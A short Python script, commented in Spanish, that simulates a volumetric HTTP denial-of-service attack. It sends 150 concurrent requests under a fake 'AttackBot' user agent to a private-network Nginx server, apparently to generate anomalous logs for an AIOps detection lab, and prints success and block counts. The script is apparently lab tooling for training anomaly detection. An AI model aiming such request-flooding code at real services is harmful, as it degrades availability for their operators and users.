#!/usr/bin/env python3
"""
Simulador de Ataque DoS Volumétrico HTTP
Genera ráfagas de peticiones concurrentes para saturar el servidor Nginx (172.20.0.10)
y generar registros anómalos para el análisis AIOps.
"""

import time
import requests
import concurrent.futures

TARGET_URL = "http://172.20.0.10/"
NUM_REQUESTS = 150
CONCURRENCY = 10

def send_request(req_id):
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; AttackBot/1.0; +http://malicious.org/bot)"
    }
    try:
        start = time.time()
        res = requests.get(TARGET_URL, headers=headers, timeout=2)
        elapsed = round((time.time() - start) * 1000, 2)
        return (req_id, res.status_code, elapsed)
    except requests.exceptions.RequestException as e:
        return (req_id, "BLOCKED / TIMEOUT", None)

def main():
    print("=" * 60)
    print(f"🚨 INICIANDO ATAQUE DoS VOLUMÉTRICO CONTRA {TARGET_URL}")
    print(f"📦 Cantidad de peticiones: {NUM_REQUESTS} | Concurrencia: {CONCURRENCY}")
    print("=" * 60)

    start_time = time.time()
    success_count = 0
    blocked_count = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures = [executor.submit(send_request, i) for i in range(1, NUM_REQUESTS + 1)]
        for future in concurrent.futures.as_completed(futures):
            req_id, status, elapsed = future.result()
            if status == 200:
                success_count += 1
                if req_id % 15 == 0:
                    print(f"  [+] Req #{req_id}: 200 OK ({elapsed}ms)")
            else:
                blocked_count += 1
                print(f"  [!] Req #{req_id}: {status}")

    total_time = round(time.time() - start_time, 2)
    print("=" * 60)
    print(f"⏱️ Ataque finalizado en {total_time} segundos.")
    print(f"📊 Exitosas (200 OK): {success_count} | Bloqueadas/Fallidas: {blocked_count}")
    print("=" * 60)

if __name__ == "__main__":
    main()

